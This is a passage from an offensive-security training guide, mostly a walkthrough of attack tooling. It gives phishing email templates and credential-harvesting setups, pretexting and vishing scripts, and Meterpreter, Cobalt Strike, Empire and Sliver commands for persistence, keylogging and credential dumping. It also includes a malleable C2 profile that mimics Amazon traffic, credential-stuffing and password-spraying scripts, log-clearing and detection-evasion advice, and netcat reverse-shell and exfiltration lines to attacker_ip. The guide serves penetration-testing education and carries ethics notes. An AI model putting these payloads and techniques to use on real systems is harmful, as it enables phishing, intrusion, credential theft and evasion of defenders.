    "listen_url": "127.0.0.1:3333",
    "use_tls": false
  },
  "phish_server": {
    "listen_url": "0.0.0.0:80",
    "use_tls": false
  }
}
EOF

# Run Gophish
chmod +x gophish
sudo ./gophish

# Access admin panel: https://localhost:3333
# Default credentials: admin / gophish (change immediately)
```

**Creating Phishing Campaign:**

```markdown
## Gophish Campaign Setup

### 1. Create Email Template
Subject: Urgent: Password Reset Required
Body:
```
Dear {{.FirstName}},

We've detected unusual activity on your account. Please reset your password immediately to secure your account.

Click here to reset: {{.URL}}

This link will expire in 24 hours.

IT Security Team
```

### 2. Create Landing Page
- Clone legitimate login page
- Add credential harvesting
- Redirect after submission

### 3. Configure Sending Profile
SMTP Server: mail.company.com
From: it-security@company.com
Username: (SMTP auth)
Password: (SMTP auth)

### 4. Import Target Groups
CSV format:
First Name, Last Name, Email, Position
John, Doe, john.doe@company.com, Developer

### 5. Launch Campaign
- Set schedule
- Track opens, clicks, submitted data
- Generate reports
```

**Email Template Examples:**

```html
<!-- Credential Harvesting Template -->
<!DOCTYPE html>
<html>
<head>
    <title>Password Reset</title>
</head>
<body>
    <h2>Account Security Alert</h2>
    <p>Dear {{.FirstName}} {{.LastName}},</p>
    
    <p>We've detected suspicious login attempts on your account from the following location:</p>
    <ul>
        <li>IP Address: 185.220.101.45</li>
        <li>Location: Moscow, Russia</li>
        <li>Time: Today at 3:47 AM</li>
    </ul>
    
    <p>If this wasn't you, please reset your password immediately:</p>
    
    <a href="{{.URL}}" style="background-color: #FF0000; color: white; padding: 10px 20px; text-decoration: none;">
        Reset Password Now
    </a>
    
    <p>This link expires in 2 hours.</p>
    
    <p>Best regards,<br>
    IT Security Team</p>
    
    {{.Tracker}}
</body>
</html>
```

### Social Engineering Toolkit (SET)

```bash
#!/bin/bash
# Social Engineering Toolkit

# Install SET
sudo apt-get install set

# Run SET
sudo setoolkit

# Main menu options:
# 1) Spear-Phishing Attack Vectors
# 2) Website Attack Vectors
# 3) Infectious Media Generator
# 4) Create Payload and Listener
# 5) Mass Mailer Attack
# 6) Arduino-Based Attack Vector
# 7) Wireless Access Point Attack Vector
# 8) QRCode Generator Attack Vector
# 9) Powershell Attack Vectors
# 10) Third Party Modules

# Example: Credential Harvester
# 1 → 2 → 3 (Site Cloner)
# Enter target URL: https://login.company.com
# SET will clone the site and harvest credentials

# Example: Phishing Email
# 1 → 1 (Perform Mass Email Attack)
# Configure SMTP and targets
# Send emails with malicious links/attachments
```

### Physical Security & Pretexting

**Tailgating/Piggybacking:**
```markdown
## Physical Security Bypass Techniques

### Tailgating
- Follow authorized person through secure door
- Carry boxes/coffee to appear busy
- Look confident and belong

### Badge Cloning
- RFID/NFC badge readers vulnerable
- Use Proxmark3 or Flipper Zero
- Clone badge frequency and data

### Lock Picking
- Learn basic lock picking
- Tools: Tension wrench, picks
- Practice: Clear padlocks

### Dumpster Diving
- Search trash for:
  - Documents with credentials
  - Network diagrams
  - Employee lists
  - Hardware with data

### Pretexting Scenarios
1. **IT Support:** "Hi, IT here. We're having server issues. What's your username?"
2. **Vendor:** "Delivery for John Doe. Can you sign here?"
3. **New Employee:** "First day, forgot my badge. Can you let me in?"
4. **Executive Assistant:** "CEO needs these docs ASAP. They're in meeting all day."
```

### Vishing (Voice Phishing)

```markdown
## Vishing Attack Examples

### Scenario 1: Tech Support
"Hello, this is David from IT. We're upgrading the email system. I need to verify your credentials to migrate your account."

### Scenario 2: Bank Fraud Department
"This is Emily from Bank Fraud Department. We've detected suspicious activity. To secure your account, I need to verify some information."

### Scenario 3: Executive Impersonation
"Hi, this is the CEO. I'm in a meeting and left my laptop at home. Can you email me the Q4 financials? It's urgent."

### Defense Strategies
- Callback verification
- Don't provide credentials over phone
- Verify through official channels
- Train employees to recognize tactics
```

## 2.11 Command & Control (C2) Frameworks

### C2 Framework Comparison

```markdown
| Framework | Language | Features | Stealth | Cost |
|-----------|----------|----------|---------|------|
| **Metasploit Meterpreter** | Ruby/C | Full-featured, stable | Medium | Free |
| **Cobalt Strike** | Java | Team server, malleable C2 | High | $3,500/year |
| **Empire/Starkiller** | PowerShell/Python | PowerShell-based, GUI | Medium | Free |
| **Covenant** | C# | .NET-based, GUI | High | Free |
| **Sliver** | Go | Modern, cross-platform | High | Free |
| **Mythic** | Python/Go | Multi-agent, web UI | High | Free |
```

### Metasploit Meterpreter Advanced

**Post-Exploitation Commands:**

```bash
# System Information
sysinfo                    # System details
getuid                     # Current user
ps                         # Process list
getpid                     # Current process ID

# Process Migration
ps                         # Find target process
migrate <PID>              # Migrate to process
# Recommended: migrate to explorer.exe or svchost.exe

# Privilege Escalation
getsystem                  # Attempt auto privesc
getprivs                   # Show privileges

# Password Dumping
hashdump                   # Dump SAM hashes
load kiwi                  # Load Mimikatz
creds_all                  # Dump all credentials
golden_ticket_create       # Create golden ticket

# Persistence
run persistence -X -i 60 -p 4444 -r attacker_ip
# -X: Startup, -i: interval, -p: port, -r: attacker IP

# Keylogging
keyscan_start              # Start keylogger
keyscan_dump               # Dump keystrokes
keyscan_stop               # Stop keylogger

# Screenshot & Webcam
screenshot                 # Capture screenshot
record_mic                 # Record audio
webcam_snap                # Webcam photo
webcam_stream              # Webcam stream

# File System
ls                         # List files
cd /path                   # Change directory
pwd                        # Current directory
cat file.txt               # Read file
download file.txt /tmp/    # Download file
upload /tmp/file.txt C:\\  # Upload file

# Network
ifconfig / ipconfig        # Network interfaces
route                      # Routing table
portfwd add -l 3389 -p 3389 -r internal_ip  # Port forward
portfwd list               # List forwards
portfwd delete -l 3389     # Remove forward

# Pivoting
run autoroute -s 172.16.0.0/24  # Add route
run autoroute -p            # Print routes

# Cleanup
clearev                    # Clear event logs
timestomp file.exe -f original.exe  # Match timestamps
```

### Cobalt Strike Essentials

**Team Server Setup:**

```bash
#!/bin/bash
# Cobalt Strike Team Server

# Start team server
sudo ./teamserver <IP> <password> <malleable_profile>

# Example:
sudo ./teamserver 10.0.0.5 StrongPassword123 amazon.profile

# Connect with GUI client
./cobaltstrike

# Generate payload
Attacks → Packages → Windows Executable (S)
# Choose listener and options
# Generate stageless beacon

# Listener types:
# - HTTP/HTTPS Beacon
# - DNS Beacon
# - SMB Beacon (peer-to-peer)
```

**Beacon Commands:**

```bash
# System Commands
shell <command>            # Execute shell command
execute <program>          # Run program
powershell <command>       # PowerShell command
powershell-import script.ps1  # Import PS script

# Privilege Escalation
elevate svc-exe <listener>  # Service escalation
runasadmin <command>       # UAC bypass
getprivs                   # Show privileges

# Credential Access
hashdump                   # Dump SAM
logonpasswords             # Mimikatz sekurlsa::logonpasswords
dcsync domain.com user     # DCSync attack

# Lateral Movement
jump psexec <target> <listener>    # PSExec
jump winrm <target> <listener>     # WinRM
remote-exec psexec <target> <command>  # Remote exec

# Pivoting
socks 1080                 # Start SOCKS proxy
covertvpn <interface>      # Covert VPN
rportfwd <port> <target>   # Reverse port forward

# Data Exfiltration
download <file>            # Download file
upload <local> <remote>    # Upload file
screenshot                 # Screenshot
keylogger                  # Keylogger

# Evasion
sleep <seconds>            # Beacon check-in interval
mode dns-txt               # Switch to DNS C2
spawn <listener>           # Spawn new beacon
inject <pid> <listener>    # Inject into process

# Cleanup
clear                      # Clear task queue
exit                       # Exit beacon
kill                       # Kill beacon process
```

**Malleable C2 Profile (Evasion):**

```c
# amazon.profile - Mimic Amazon traffic

set sleeptime "60000";      # 60 second callback
set jitter "20";            # 20% jitter
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0";

http-get {
    set uri "/s/ref=nb_sb_noss";
    
    client {
        header "Host" "www.amazon.com";
        header "Accept" "text/html,application/xhtml+xml";
        metadata {
            base64url;
            prepend "session-token=";
            prepend "skin=noskin;";
            append "csm-hit=s-123456789|987654321";
            header "Cookie";
        }
    }
    
    server {
        header "Server" "Server";
        header "x-amz-id-1" "RANDOMDATA";
        output {
            base64url;
            print;
        }
    }
}

http-post {
    set uri "/N/search/ref=random";
    
    client {
        header "Host" "www.amazon.com";
        id {
            base64url;
            parameter "id";
        }
        output {
            base64url;
            print;
        }
    }
    
    server {
        output {
            base64url;
            print;
        }
    }
}
```

### Empire/Starkiller

**Empire Setup:**

```bash
#!/bin/bash
# PowerShell Empire with Starkiller GUI

# Install Empire
git clone https://github.com/BC-SECURITY/Empire
cd Empire
sudo ./setup/install.sh

# Start Empire
sudo ./empire

# Install Starkiller (GUI)
wget https://github.com/BC-SECURITY/Starkiller/releases/download/v1.10.0/starkiller-1.10.0.AppImage
chmod +x starkiller-1.10.0.AppImage
./starkiller-1.10.0.AppImage

# Connect to Empire server
# URL: https://localhost:1337
# Username/Password: Set during installation
```

**Empire Usage:**

```powershell
# Create listener
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Name http1
(Empire: listeners/http) > set Host http://10.0.0.5:8080
(Empire: listeners/http) > execute

# Generate stager
(Empire) > usestager windows/launcher_bat
(Empire: stager/windows/launcher_bat) > set Listener http1
(Empire: stager/windows/launcher_bat) > execute

# View agents
(Empire) > agents

# Interact with agent
(Empire) > interact AGENT_NAME

# Agent commands
(Empire: AGENT_NAME) > info
(Empire: AGENT_NAME) > shell whoami
(Empire: AGENT_NAME) > download C:\file.txt
(Empire: AGENT_NAME) > upload /tmp/tool.exe

# Use modules
(Empire: AGENT_NAME) > usemodule powershell/situational_awareness/network/powerview/get_domain_controller
(Empire: module) > execute

# Credential gathering
(Empire: AGENT_NAME) > usemodule powershell/credentials/mimikatz/logonpasswords
(Empire: AGENT_NAME) > usemodule powershell/credentials/vault_credential

# Lateral movement
(Empire: AGENT_NAME) > usemodule powershell/lateral_movement/invoke_psremoting
```

### Sliver C2

**Sliver Server Setup:**

```bash
#!/bin/bash
# Sliver C2 Framework

# Install Sliver
curl https://sliver.sh/install | sudo bash

# Start Sliver
sliver-server

# Generate implant
sliver > generate --http attacker.com --save /tmp/
# Creates sliver.exe

# Start HTTP listener
sliver > http --lport 80

# Wait for beacon
sliver > beacons

# Interact with beacon
sliver > use <beacon_id>

# Commands
sliver (beacon) > info
sliver (beacon) > whoami
sliver (beacon) > ps
sliver (beacon) > pwd
sliver (beacon) > ls

# Interactive session
sliver (beacon) > interactive

sliver (session) > shell
# Now in full interactive shell

# Privilege escalation
sliver > getsystem

# Credentials
sliver > hashdump
sliver > procdump <pid>

# Pivoting
sliver > portfwd add --bind 127.0.0.1:3389 --remote 172.16.0.10:3389
sliver > socks5 start

# C2 Profiles
sliver > profiles new --http example.com:443 --format shellcode my-profile
```

## 2.5 Password Attacks (Completion)

### Hash Extraction

**Windows Hash Extraction:**

```bash
#!/bin/bash
# Windows Hash Extraction Methods

# Method 1: Mimikatz (if admin)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords  # Cleartext passwords
mimikatz # lsadump::sam              # SAM hashes
mimikatz # lsadump::secrets          # LSA secrets

# Method 2: Impacket secretsdump
secretsdump.py domain/user:password@target_ip

# With NTLM hash
secretsdump.py -hashes :ntlm_hash domain/user@target_ip

# Method 3: Copy SAM and SYSTEM
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save

# Extract hashes offline
impacket-secretsdump -sam sam.save -system system.save LOCAL

# Method 4: Volume Shadow Copy
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system

# Method 5: NTDS.dit (Domain Controller)
# Using ntdsutil
ntdsutil
activate instance ntds
ifm
create full C:\temp\ntds
quit
quit

# Extract from NTDS.dit
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

**Linux Hash Extraction:**

```bash
#!/bin/bash
# Linux Hash Extraction

# Read /etc/shadow (requires root)
cat /etc/shadow

# Format:
# username:$algorithm$salt$hash:lastchange:min:max:warn:inactive:expire

# Unshadow (combine passwd and shadow)
unshadow /etc/passwd /etc/shadow > hashes.txt

# Crack with John
john hashes.txt

# Extract from backup
cat /var/backups/shadow
cat /etc/shadow-  # Backup file
```

### Advanced Hashcat Techniques

```bash
#!/bin/bash
# Advanced Hashcat Techniques

# Mask Attack
# Pattern: Company + Year + Special
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?l?d?d?d?d?s

# Hybrid Attack
# Wordlist + Mask
hashcat -m 1000 -a 6 hashes.txt wordlist.txt ?d?d?d?d

# Combinator Attack
hashcat -m 1000 -a 1 hashes.txt wordlist1.txt wordlist2.txt

# Rule-based Attack
hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Multiple rules
hashcat -m 1000 hashes.txt wordlist.txt -r rule1.rule -r rule2.rule

# Custom rules
# rules.txt:
# $1 $2 $3          # Append 123
# ^P ^a ^s ^s       # Prepend Pass
# c                 # Capitalize
# $@ $!             # Append @!

hashcat -m 1000 hashes.txt wordlist.txt -r custom.rule

# Benchmark to optimize
hashcat -b -m 1000

# Use specific devices (GPU)
hashcat -m 1000 -d 1,2 hashes.txt wordlist.txt

# Session management
hashcat -m 1000 hashes.txt wordlist.txt --session mysession
# Resume: hashcat --session mysession --restore

# Incremental brute force
hashcat -m 1000 -a 3 hashes.txt --increment --increment-min 8 --increment-max 12 ?a?a?a?a?a?a?a?a?a?a?a?a
```

### Credential Stuffing

```python
#!/usr/bin/env python3
"""
Credential Stuffing Attack (Educational Purpose)
"""
import requests
from concurrent.futures import ThreadPoolExecutor

class CredentialStuffer:
    """
    Automated credential stuffing
    WARNING: Use only on authorized targets
    """
    
    def __init__(self, target_url, login_endpoint):
        self.target = target_url
        self.endpoint = login_endpoint
        self.successful = []
    
    def test_credential(self, username, password):
        """Test single credential pair"""
        
        data = {
            'username': username,
            'password': password
        }
        
        try:
            response = requests.post(
                f"{self.target}{self.endpoint}",
                data=data,
                timeout=10
            )
            
            # Check for successful login
            success_indicators = [
                'welcome',
                'dashboard',
                'logout',
                'success'
            ]
            
            if any(indicator in response.text.lower() for indicator in success_indicators):
                self.successful.append({
                    'username': username,
                    'password': password
                })
                print(f"[+] SUCCESS: {username}:{password}")
                return True
            
        except Exception as e:
            pass
        
        return False
    
    def run_attack(self, credentials_file, threads=10):
        """
        Run credential stuffing attack
        credentials_file format: username:password
        """
        
        with open(credentials_file, 'r') as f:
            credentials = [line.strip().split(':') for line in f]
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [
                executor.submit(self.test_credential, user, pwd)
                for user, pwd in credentials
            ]
            
            for future in futures:
                future.result()
        
        return self.successful

# Defense: Rate limiting, CAPTCHA, account lockout, IP blocking
```

### Password Spraying

```powershell
# Password Spraying - Single password against many accounts
# Avoids account lockout by trying one password for all users

# PowerShell script
$users = Get-Content users.txt
$password = "Summer2024!"

foreach ($user in $users) {
    $SecPassword = ConvertTo-SecureString $password -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential($user, $SecPassword)
    
    try {
        Start-Sleep -Seconds 30  # Delay between attempts
        $session = New-PSSession -ComputerName DC01 -Credential $cred -ErrorAction Stop
        Write-Host "[+] Success: $user : $password" -ForegroundColor Green
        Remove-PSSession $session
    }
    catch {
        Write-Host "[-] Failed: $user" -ForegroundColor Red
    }
}
```

## 2.12 Burp Suite Professional Guide

### Burp Suite Setup

```markdown
## Burp Suite Configuration

### Proxy Setup
1. Proxy → Options → Proxy Listeners
2. Add listener: 127.0.0.1:8080
3. Configure browser to use proxy
4. Import Burp CA certificate

### Scope Configuration
1. Target → Scope
2. Add target domain
3. Proxy → Options → Intercept Client Requests
4. Check "And URL is in target scope"
```

### Core Features

**Intercepting Requests:**

```markdown
## Intercept and Modify Requests

### Enable Intercept
Proxy → Intercept → Intercept is on

### Modify Request
1. Change parameters
2. Add/remove headers
3. Modify cookies
4. Change HTTP method

### Forward/Drop
- Forward: Send modified request
- Drop: Discard request
- Action: Send to other tools
```

**Repeater:**

```markdown
## Repeater - Manual Request Testing

### Send to Repeater
Right-click request → Send to Repeater

### Features
- Modify and resend requests
- Compare responses
- Test different payloads
- URL encode/decode
- Base64 encode/decode

### Use Cases
- SQL injection testing
- XSS testing
- Authentication bypass
- Parameter tampering
```

**Intruder (Attack Automation):**

```markdown
## Intruder - Automated Attacks

### Attack Types

1. **Sniper**: Single payload set, one position
   - Use: Test single parameter with wordlist

2. **Battering Ram**: Single payload set, all positions
   - Use: Same value in multiple parameters

3. **Pitchfork**: Multiple payload sets, parallel
   - Use: Username:password pairs

4. **Cluster Bomb**: Multiple payload sets, combinations
   - Use: Test all combinations

### Example: Brute Force Login
1. Capture login request
2. Send to Intruder
3. Mark username and password as positions
4. Load wordlists
5. Start attack
6. Filter by response length/status
```

**Scanner (Professional Only):**

```markdown
## Burp Scanner

### Passive Scanning
- Automatic during browsing
- No additional requests sent
- Finds: Information disclosure, cookies issues

### Active Scanning
1. Right-click target → Scan
2. Select scan type
3. Configure scan settings
4. Review findings

### Scan Types
- Crawl and Audit
- Audit selected items
- Audit from here

### Findings
- High: SQL injection, XSS, RCE
- Medium: CSRF, security misconfig
- Low: Information leakage
- Info: Fingerprinting results
```

**Extensions:**

```markdown
## Useful Burp Extensions

### Essential Extensions
1. **Autorize**: Authorization testing
2. **Turbo Intruder**: Fast attacks
3. **Logger++**: Advanced logging
4. **J2EEScan**: Java vulnerabilities
5. **JSON Beautifier**: Format JSON
6. **Param Miner**: Find hidden parameters
7. **Upload Scanner**: File upload testing
8. **Retire.js**: Vulnerable JS libraries
```

## Conclusion & Key Takeaways

### Part 2 Summary

**Skills Acquired:**
✅ Comprehensive reconnaissance techniques (passive and active)
✅ Vulnerability assessment methodologies
✅ Exploitation using Metasploit and manual techniques
✅ Complete OWASP Top 10 understanding with practical examples
✅ Active Directory attack chains (BloodHound, Kerberoasting, PTH)
✅ Windows and Linux privilege escalation
✅ Post-exploitation and lateral movement
✅ Wireless network attacks (WPA2, WPS, Evil Twin)
✅ Mobile application security (Android/iOS)
✅ Social engineering tactics
✅ C2 framework operation
✅ Advanced password cracking
✅ Burp Suite mastery

### Certification Mapping

**CEH (Certified Ethical Hacker):**
- Reconnaissance (Phase 1) ✅
- Scanning & Enumeration (Phase 2) ✅
- System Hacking (Phase 3) ✅
- Web Application Hacking ✅
- Wireless Network Hacking ✅
- Mobile Platform Hacking ✅
- Social Engineering ✅

**OSCP (Offensive Security Certified Professional):**
- Information Gathering ✅
- Vulnerability Scanning ✅
- Exploitation ✅
- Privilege Escalation ✅
- Lateral Movement ✅
- Reporting ✅

**Security+ (CompTIA):**
- Threats, Attacks & Vulnerabilities ✅
- Architecture & Design (defensive) ✅
- Implementation (controls) ✅

**CISSP:**
- Security Assessment & Testing ✅
- Security Operations ✅

### Next Steps

**Continue Learning:**
1. Practice in lab environments (HackTheBox, TryHackMe, VulnHub)
2. Participate in CTF competitions
3. Contribute to bug bounty programs (after mastery)
4. Pursue certifications (CEH, OSCP, GPEN)
5. Stay updated with latest vulnerabilities and techniques

**Ethical Guidelines:**
- Only test systems you own or have written permission to test
- Follow responsible disclosure for vulnerabilities found
- Respect privacy and data protection laws
- Use knowledge for defensive purposes
- Never cause harm or disruption

### Resources for Continued Learning

**Practice Platforms:**
- HackTheBox.eu
- TryHackMe.com
- VulnHub.com
- PentesterLab.com
- PortSwigger Web Security Academy

**Communities:**
- Reddit: /r/netsec, /r/AskNetsec
- Discord: Many security-focused servers
- Twitter: Follow security researchers
- GitHub: Security tool repositories

**References:**
- OWASP Testing Guide
- PTES (Penetration Testing Execution Standard)
- NIST Cybersecurity Framework
- MITRE ATT&CK Framework

---

**This concludes Part 2: Offensive Security & Ethical Hacking**

You now have comprehensive knowledge of offensive security techniques, from initial reconnaissance to post-exploitation. Remember: With great power comes great responsibility. Use this knowledge ethically and legally.

## Frequently Asked Questions (FAQs)

### FAQ 1: How do I avoid detection during penetration testing?

**Answer:**

Detection avoidance requires a multi-layered approach:

**Network Level:**
```bash
# 1. Slow down scans
nmap -T2 --max-rate 10 target.com  # Polite timing
nmap --scan-delay 5s target.com     # 5-second delay between probes

# 2. Randomize scan order
nmap --randomize-hosts -iL targets.txt

# 3. Use decoy scanning
nmap -D RND:10 target.com  # 10 random decoys
nmap -D decoy1,decoy2,ME,decoy3 target.com  # Specific decoys

# 4. Fragment packets
nmap -f target.com  # Fragment packets into 8 bytes
nmap --mtu 16 target.com  # Custom MTU

# 5. Use proxies
proxychains nmap -sT target.com
```

**Application Level:**
```python
# Rotate User-Agents
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
]

import random
headers = {'User-Agent': random.choice(user_agents)}

# Add delays between requests
import time
time.sleep(random.uniform(2, 5))

# Rotate IP addresses (use Tor, VPN, or proxies)
```

**C2 Level:**
```bash
# Cobalt Strike malleable profile
set sleeptime "300000";  # 5 minute callback
set jitter "40";         # 40% jitter
set useragent "Mozilla/5.0 (compatible; MSIE 9.0)";

# Metasploit session communication
meterpreter > set_timeouts 120 30 60  # Longer timeouts
```

**General OPSEC:**
1. **Time your activities** - Avoid patterns (9-5 weekdays)
2. **Blend with normal traffic** - Mimic legitimate user behavior
3. **Use HTTPS** - Encrypted C2 channels
4. **Clean up artifacts** - Remove tools, logs, IOCs
5. **Rotate infrastructure** - Change IPs, domains regularly

**Detection Methods to Avoid:**
- IDS/IPS: Use encrypted protocols, avoid signatures
- EDR: Fileless malware, process injection, living-off-the-land
- SIEM: Randomize timing, avoid log patterns
- SOC Analysts: Stay within baseline activity

**Red Flag Behaviors:**
- ❌ Port scanning entire ranges
- ❌ Multiple failed login attempts
- ❌ Unusual outbound connections
- ❌ Large data transfers
- ❌ Executing from unusual locations

**Best Practices:**
- ✅ Start with passive reconnaissance
- ✅ Use authorized tools when possible
- ✅ Limit scope to target systems only
- ✅ Monitor for defensive actions
- ✅ Have incident response plan ready

---

### FAQ 2: What's the difference between vulnerability assessment and penetration testing?

**Answer:**

**Vulnerability Assessment:**
- **Goal:** Identify and quantify vulnerabilities
- **Scope:** Broad, comprehensive
- **Depth:** Surface-level, automated scanning
- **Output:** List of vulnerabilities with severity ratings
- **Frequency:** Regular (monthly/quarterly)
- **Tools:** Nessus, OpenVAS, Qualys
- **Effort:** Lower, mostly automated
- **Report:** Technical vulnerability report

**Example Vulnerability Assessment:**
```bash
# Scan entire network
nmap -sV -p- 10.0.0.0/24

# Run vulnerability scanner
openvas-start
# Configure scan for 10.0.0.0/24
# Review findings report
```

**Penetration Testing:**
- **Goal:** Exploit vulnerabilities to achieve objectives
- **Scope:** Targeted, specific goals
- **Depth:** Deep, manual exploitation
- **Output:** Proof of compromise, business impact
- **Frequency:** Periodic (annually/bi-annually)
- **Tools:** Metasploit, Burp Suite, custom exploits
- **Effort:** Higher, requires expertise
- **Report:** Executive summary + technical details

**Example Penetration Test:**
```bash
# 1. Reconnaissance
nmap -sV -p- target.com
fierce -dns target.com

# 2. Vulnerability identification
nikto -h target.com
sqlmap -u "http://target.com/page?id=1"

# 3. Exploitation
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
exploit

# 4. Post-exploitation
meterpreter > hashdump
meterpreter > download sensitive_data.xlsx

# 5. Reporting
# Document: How you got in, what you accessed, business impact
```

**Comparison Table:**

| Aspect | Vulnerability Assessment | Penetration Testing |
|--------|-------------------------|-------------------|
| **Approach** | Automated scanning | Manual exploitation |
| **Coverage** | Broad (all systems) | Focused (specific targets) |
| **Risk** | Low (read-only) | High (active exploitation) |
| **Time** | Hours/Days | Days/Weeks |
| **Cost** | Lower | Higher |
| **Skill Required** | Moderate | Advanced |
| **Business Value** | Compliance, inventory | Real-world risk assessment |

**When to Use Each:**

**Vulnerability Assessment:**
- Continuous security monitoring
- Compliance requirements (PCI-DSS, HIPAA)
- Patch management prioritization
- Security posture baseline

**Penetration Testing:**
- Before major releases
- After significant infrastructure changes
- Annual security validation
- Red team exercises
- Pre-merger due diligence

**Best Practice:** Combine both
1. Regular vulnerability assessments (monthly)
2. Annual penetration testing
3. Continuous threat hunting

---

### FAQ 3: How do I practice offensive security skills legally and ethically?

**Answer:**

**Legal Practice Environments:**

**1. Intentionally Vulnerable VMs:**
```bash
# Download vulnerable machines
# Metasploitable 2 & 3
wget https://sourceforge.net/projects/metasploitable/

# DVWA (Damn Vulnerable Web Application)
docker pull vulnerables/web-dvwa
docker run -p 80:80 vulnerables/web-dvwa

# VulnHub (hundreds of vulnerable VMs)
# Visit: https://www.vulnhub.com

# OWASP WebGoat
docker run -p 8080:8080 -e TZ=America/New_York webgoat/goatandwolf
```

**2. Online Platforms:**

**HackTheBox:**
```markdown
- URL: https://www.hackthebox.eu
- Free tier + VIP ($14/month)
- 150+ active machines
- Realistic enterprise environments
- Certification: OSCP-like boxes
```

**TryHackMe:**
```markdown
- URL: https://tryhackme.com
- Beginner-friendly
- Guided learning paths
- Free + Premium ($10/month)
- Browser-based access
```

**PentesterLab:**
```markdown
- URL: https://pentesterlab.com
- Web application focus
- 100+ exercises
- Free + PRO ($20/month)
```

**3. Bug Bounty Programs:**
```markdown
## Start with Public Programs

**HackerOne:**
- https://hackerone.com
- Programs: GitHub, Shopify, PayPal
- Start with "Easy" targets

**Bugcrowd:**
- https://bugcrowd.com
- Programs: Tesla, OpenAI
- Read disclosure policies carefully

**Synack Red Team:**
- https://synack.com
- Application required
- Professional platform

**Rules:**
1. Only test in-scope assets
2. Follow disclosure timeline
3. Don't test on production without permission
4. Report responsibly
```

**4. Personal Lab Setup:**
```bash
#!/bin/bash
# Create personal pentesting lab

# 1. Hypervisor
# VMware Workstation or VirtualBox

# 2. Attacking machine
# Download Kali Linux
# URL: https://www.kali.org/get-kali/

# 3. Target machines
# Windows 10 (evaluation): https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/
# Ubuntu Server: https://ubuntu.com/download/server
# Metasploitable 2: https://sourceforge.net/projects/metasploitable/

# 4. Network isolation
# Create isolated network or NAT

# 5. Install vulnerable apps
# DVWA, WebGoat, Juice Shop, bWAPP
```

**5. Capture The Flag (CTF) Competitions:**
```markdown
## Regular CTFs

**PicoCTF:**
- Beginner-friendly
- Free
- Run by Carnegie Mellon

**OverTheWire:**
- https://overthewire.org
- Progressive difficulty
- Wargames format

**CTFtime:**
- https://ctftime.org
- Calendar of upcoming CTFs
- Team rankings
```

**6. GitHub Projects:**
```bash
# Clone and analyze vulnerable code
git clone https://github.com/OWASP/NodeGoat
git clone https://github.com/bkimminich/juice-shop
git clone https://github.com/rapid7/metasploitable3

# Study exploit development
git clone https://github.com/offensive-security/exploitdb
```

**Ethical Guidelines:**

**✅ DO:**
- Practice on your own systems
- Use dedicated lab environments
- Participate in authorized bug bounties
- Follow responsible disclosure
- Get written permission before testing
- Stay within defined scope

**❌ DON'T:**
- Test production systems without permission
- Access others' data without authorization
- Cause damage or disruption
- Share credentials you discover
- Ignore bug bounty rules
- Test government/military systems

**Legal Considerations:**

**Computer Fraud and Abuse Act (CFAA) - USA:**
- Unauthorized access is illegal
- Even "just looking" can be prosecuted
- Penalties: Fines up to $250,000, imprisonment up to 10 years

**Similar Laws Worldwide:**
- UK: Computer Misuse Act 1990
- EU: Directive 2013/40/EU
- Australia: Cybercrime Act 2001
- Canada: Criminal Code Section 342.1

**Safe Harbor:**
- Bug bounty programs provide legal safe harbor
- Written permission (scope agreement) is essential
- Some companies have "Security.txt" with disclosure policies

---

### FAQ 4: What tools should I master first as a beginner?

**Answer:**

**Essential Tools Roadmap:**

**Phase 1: Reconnaissance (First 2 weeks)**

```bash
# 1. Nmap - Network scanner
# Master these first:
nmap -sV -sC target.com          # Version detection + default scripts
nmap -p- target.com              # All ports
nmap -A target.com               # Aggressive scan
nmap --script vuln target.com    # Vulnerability scripts

# Practice project:
# Scan your home network, identify all devices

# 2. Sublist3r - Subdomain enumeration
python sublist3r.py -d target.com

# 3. theHarvester - Email/subdomain gathering
theHarvester -d target.com -b google

# Practice project:
# Map out the infrastructure of a public company (passive only)
```

**Phase 2: Vulnerability Assessment (Weeks 3-4)**

```bash
# 4. Nikto - Web server scanner
nikto -h http://target.com

# 5. SQLMap - SQL injection
sqlmap -u "http://target.com/page?id=1" --dbs

# 6. Burp Suite Community - Web proxy
# Learn to:
# - Intercept requests
# - Use Repeater
# - Use Intruder for basic fuzzing

# Practice project:
# Set up DVWA, find and exploit all vulnerabilities
```

**Phase 3: Exploitation (Weeks 5-8)**

```bash
# 7. Metasploit Framework
# Master workflow:
msfconsole
search smb
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS target
set LHOST attacker
exploit

# Practice project:
# Exploit Metasploitable 2 using 5 different vulnerabilities

# 8. Netcat - Swiss army knife
# Reverse shell:
nc -lvnp 4444                    # Attacker (listener)
nc attacker_ip 4444 -e /bin/bash # Target (connect back)

# File transfer:
nc -lvnp 4444 > file.txt         # Receiver
nc attacker_ip 4444 < file.txt   # Sender

# Practice project:
# Set up reverse shells on your test VMs
```

**Phase 4: Post-Exploitation (Weeks 9-12)**

```bash
# 9. Mimikatz - Windows credential dumping
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# 10. LinPEAS / WinPEAS - Privilege escalation
# Linux:
./linpeas.sh

# Windows:
winpeas.exe

# 11. John the Ripper / Hashcat - Password cracking
john --wordlist=rockyou.txt hashes.txt
hashcat -m 1000 -a 0 hashes.txt rockyou.txt

# Practice project:
# Gain initial access to VM, escalate to root/SYSTEM
```

**Learning Path by Certification:**

**For Security+ (Entry Level):**
```markdown
1. Nmap (scanning basics)
2. Wireshark (packet analysis)
